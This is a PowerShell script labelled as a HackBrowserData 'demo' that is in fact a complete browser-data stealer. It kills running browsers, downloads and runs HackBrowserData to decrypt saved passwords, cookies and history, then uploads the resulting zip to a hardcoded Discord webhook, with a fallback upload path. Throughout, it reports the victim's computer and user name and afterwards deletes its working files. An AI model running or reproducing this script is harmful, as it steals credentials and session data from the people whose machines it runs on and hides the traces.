# HackBrowserData Demo - Version corrigée JSON
$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

# Fonction pour envoyer proprement à Discord
function Send-DiscordMessage {
    param([string]$message)
    try {
        $payload = @{content=$message} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $wh -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {}
}

# Notification de démarrage
Send-DiscordMessage "🟢 Script started on **$env:COMPUTERNAME** by **$env:USERNAME**"

# Kill browsers de manière agressive
$browsers = @("chrome","msedge","firefox","opera","iexplore","vivaldi")
foreach ($browser in $browsers) {
    Get-Process -Name $browser -ErrorAction SilentlyContinue | Stop-Process -Force
}

Start-Sleep -Seconds 5

# Vérifier qu'ils sont bien fermés
foreach ($browser in $browsers) {
    $retries = 0
    while ((Get-Process -Name $browser -ErrorAction SilentlyContinue) -and ($retries -lt 10)) {
        Stop-Process -Name $browser -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        $retries++
    }
}

cd $env:TEMP
Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0

Send-DiscordMessage "📥 Downloading HackBrowserData..."

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip" -OutFile hbd.zip -UseBasicParsing
    
    Send-DiscordMessage "📦 Extracting..."
    
    Expand-Archive hbd.zip -DestinationPath HBD -Force
    cd HBD
    
    Send-DiscordMessage "🔓 Decrypting browser data..."
    
    # Exécuter HackBrowserData
    $output = .\hack-browser-data.exe --browser all --format json --dir output --zip 2>&1
    
    Start-Sleep -Seconds 3
    
    if (Test-Path "results.zip") {
        $fileSize = (Get-Item "results.zip").Length / 1KB
        
        Send-DiscordMessage "📤 Uploading data ($([math]::Round($fileSize, 2)) KB)..."
        
        curl.exe -F "file=@results.zip" -F "content=**✅ Data from $env:COMPUTERNAME**`n**User:** $env:USERNAME`n**Size:** $([math]::Round($fileSize, 2)) KB`n**Date:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" $wh
        
        Send-DiscordMessage "✅ Upload complete!"
    } else {
        Send-DiscordMessage "❌ ERROR: No results.zip created"
        
        # Fallback manuel
        if (Test-Path "output") {
            Compress-Archive -Path "output\*" -DestinationPath "manual.zip" -Force -ErrorAction SilentlyContinue
            if (Test-Path "manual.zip") {
                curl.exe -F "file=@manual.zip" -F "content=**📁 Fallback data from $env:COMPUTERNAME**" $wh
            }
        }
    }
    
} catch {
    # Nettoyer le message d'erreur des caractères spéciaux
    $errorMsg = $_.Exception.Message -replace '"',"'" -replace "`n"," " -replace "`r",""
    Send-DiscordMessage "❌ EXCEPTION: $errorMsg"
}

cd ..
Start-Sleep -Seconds 3
Remove-Item hbd.zip,HBD -Recurse -Force -EA 0

Send-DiscordMessage "🧹 Script finished."
